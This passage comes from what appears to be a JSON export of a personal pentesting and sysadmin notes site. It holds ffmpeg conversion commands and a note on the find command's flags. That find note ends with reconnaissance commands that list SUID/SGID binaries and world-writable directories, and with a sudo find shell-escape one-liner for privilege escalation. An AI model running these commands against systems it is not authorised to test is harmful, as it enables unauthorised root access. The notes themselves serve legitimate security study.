32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, so 0 is the highest quality and 9 is the lowest quality. While &lt;a href=&quot;https://superuser.com/questions/704493/ffmpeg-convert-m4a-to-mp3-without-significant-loss/704535#704535&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;everyone says to use 3 or 4 for this parameter&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, in my experience even using 0 will often result in a &lt;em&gt;smaller&lt;/em&gt; file than an m4a original. (What’s up with that? I thought that m4a was supposed to be more efficient than mp3?)&lt;/p&gt;\n&lt;h2 id=&quot;mp4-to-gif&quot;&gt;MP4 to GIF&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#mp4-to-gif&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Adapted from &lt;a href=&quot;https://homehack.nl/create-animated-gifs-from-mp4-with-ffmpeg/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Create animated GIFs from MP4 with FFmpeg&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Generate an optimized palette.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ffmpeg&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $INPUT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.mp4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;       -filter_complex&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;[0:v] palettegen&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PALETTE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.png&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Convert the MP4 to GIF (using the palette above).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ffmpeg&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $INPUT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.mp4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PALETTE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.png&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;       -filter_complex&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;[0:v][1:v] paletteuse&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\t                    $OUTPUT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.gif&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;mp4-to-webp&quot;&gt;MP4 to WebP&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#mp4-to-webp&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Adapted from &lt;a href=&quot;https://mattj.io/posts/2021-02-27-create-animated-gif-and-webp-from-videos-using-ffmpeg/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Create animated GIF and WebP from videos using FFmpeg&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ffmpeg&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $INPUT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.mp4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;       -vf&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;fps=10,scale=720:-1:flags=lanczos&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;       -vcodec&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; libwebp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -lossless&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -compression_level&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 6&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;       -q:v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 50&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -loop&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -preset&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; picture&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -an&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;       -vsync&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $OUTPUT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.webp&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/find":{"slug":"spells/find","filePath":"spells/find.md","title":"find","links":["spells/find","spells/UNIX-permissions","spells/sudo"],"tags":["Application/find","AttackCycle/Reconnaissance","Application/sudo","AttackCycle/PrivEsc"],"content":"Basics\nSome useful find flags related to file metadata.\nOwnership\nThe -user and -group flags match files and folders owned by a particular user or group (both numeric and symbolic-readable names are allowed).\nFile size\nThe -size flag matches files of size n.\nPrefix n with + or - to match files strictly greater than or less than n in size. To specify useful sizes, use a suffix.\n\nc — Bytes\nk — Kilobytes\nM — Megabytes\nG — Gigabytes\n\nFor example, use -size +4G to find files over 4 GB (i.e., those that can’t be written to a FAT32 file system).\nPermissions\nThe -perm flag matches files and folders with a given permission. Both numeric and symbolic permissions are allowed.\nUse the / or - prefix to match files with any of the specified permissions or at least the specified permissions. For example, -perm -644 will match any file where the current user has at least read + write access and any other user has at least read access (so, - requires the specified permissions, but is agnostic as to the presence/absence of additional permissions). Likewise, -perm /666 will match files where the current user has read + write access and/or the current group has read + write access and/or everyone has read + write access (so, / requires that at least one of the specified permissions groups matches exactly, but is agnostic to the state of any other group outside of that match).\nTimestamps\nThe -Xmin and -Xtime flags match files accessed (a), had their contents modified (m), or had their inode changed (c) n minutes (-Xmin) or days (-Xtime) ago.\nAll mtime changes are ctime changes, but the reverse is not necessarily true.\nPrefix n with + or - to match files strictly before or after the specified time in the past.\nFor example:\n# Matches files accessed *more* than 30 minutes ago\n#\nfind . -type f -amin +30\n \n# Matches files modified *less* than 7 days ago\n#\nfind . -type f -mtime -7\n \n# Matches files modified *today*\n#\nfind . -type f -mtime 0\nReconnaissance\nFind SUID and SGID executables\nfind / -type f \\\n       -a \\( -perm -u+s -o -perm -g+s \\) \\\n       -exec ls -l {} \\; 2&gt; /dev/null\nFind world writable/executable folders\nfind / -type d -a \\( -perm -o+w -perm -o+x \\) 2&gt;/dev/null\nShell escape\nIf find can be run with NOPASSWD via sudo, then try:\nsudo find . -exec /bin/sh \\; -quit","richContent":"&lt;h2 id=&quot;basics&quot;&gt;Basics&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#basics&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Some useful &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/find&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/find&quot;&gt;find&lt;/a&gt; flags related to file metadata.&lt;/p&gt;\n&lt;h3 id=&quot;ownership&quot;&gt;Ownership&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#ownership&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;The &lt;code&gt;-user&lt;/code&gt; and &lt;code&gt;-group&lt;/code&gt; flags match files and folders owned by a particular user or group (both numeric and symbolic-readable names are allowed).&lt;/p&gt;\n&lt;h3 id=&quot;file-size&quot;&gt;File size&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#file-size&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;The &lt;code&gt;-size&lt;/code&gt; flag matches files of size &lt;code&gt;n&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;Prefix &lt;code&gt;n&lt;/code&gt; with &lt;code&gt;+&lt;/code&gt; or &lt;code&gt;-&lt;/code&gt; to match files &lt;em&gt;strictly&lt;/em&gt; greater than or less than &lt;code&gt;n&lt;/code&gt; in size. To specify useful sizes, use a suffix.&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;c&lt;/code&gt; — Bytes&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;k&lt;/code&gt; — Kilobytes&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;M&lt;/code&gt; — Megabytes&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;G&lt;/code&gt; — Gigabytes&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;For example, use &lt;code&gt;-size +4G&lt;/code&gt; to find files over 4 GB (i.e., those that can’t be written to a FAT32 file system).&lt;/p&gt;\n&lt;h3 id=&quot;permissions&quot;&gt;Permissions&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#permissions&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;The &lt;code&gt;-perm&lt;/code&gt; flag matches files and folders with a given permission. Both numeric and &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UNIX-permissions&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UNIX-permissions&quot;&gt;symbolic&lt;/a&gt; permissions are allowed.&lt;/p&gt;\n&lt;p&gt;Use the &lt;code&gt;/&lt;/code&gt; or &lt;code&gt;-&lt;/code&gt; prefix to match files with &lt;em&gt;any&lt;/em&gt; of the specified permissions or &lt;em&gt;at least&lt;/em&gt; the specified permissions. For example, &lt;code&gt;-perm -644&lt;/code&gt; will match any file where the current user has &lt;em&gt;at least&lt;/em&gt; read + write access and any other user has &lt;em&gt;at least&lt;/em&gt; read access (so, &lt;code&gt;-&lt;/code&gt; requires the specified permissions, but is agnostic as to the presence/absence of additional permissions). Likewise, &lt;code&gt;-perm /666&lt;/code&gt; will match files where the current user has read + write access and/or the current group has read + write access and/or everyone has read + write access (so, &lt;code&gt;/&lt;/code&gt; requires that at least &lt;em&gt;one&lt;/em&gt; of the specified permissions groups matches exactly, but is agnostic to the state of any other group outside of that match).&lt;/p&gt;\n&lt;h3 id=&quot;timestamps&quot;&gt;Timestamps&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#timestamps&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;The &lt;code&gt;-Xmin&lt;/code&gt; and &lt;code&gt;-Xtime&lt;/code&gt; flags match files accessed (&lt;code&gt;a&lt;/code&gt;), had their &lt;em&gt;contents&lt;/em&gt; modified (&lt;code&gt;m&lt;/code&gt;), or had their &lt;em&gt;inode&lt;/em&gt; changed (&lt;code&gt;c&lt;/code&gt;) &lt;code&gt;n&lt;/code&gt; minutes (&lt;code&gt;-Xmin&lt;/code&gt;) or days (&lt;code&gt;-Xtime&lt;/code&gt;) ago.&lt;/p&gt;\n&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/8346852/how-to-modify-last-status-change-ctime-property-of-a-file-in-unix#8346905&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;All mtime changes are ctime changes, but the reverse is not necessarily true.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;Prefix &lt;code&gt;n&lt;/code&gt; with &lt;code&gt;+&lt;/code&gt; or &lt;code&gt;-&lt;/code&gt; to match files &lt;em&gt;strictly&lt;/em&gt; before or after the specified time in the &lt;em&gt;past&lt;/em&gt;.&lt;/p&gt;\n&lt;p&gt;For example:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Matches files accessed *more* than 30 minutes ago&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;find&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; .&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -amin&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; +30&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Matches files modified *less* than 7 days ago&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;find&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; .&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -mtime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -7&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Matches files modified *today*&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;find&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; .&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -mtime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;reconnaissance&quot;&gt;Reconnaissance&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#reconnaissance&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=&quot;find-suid-and-sgid-executables&quot;&gt;Find SUID and SGID executables&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#find-suid-and-sgid-executables&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; 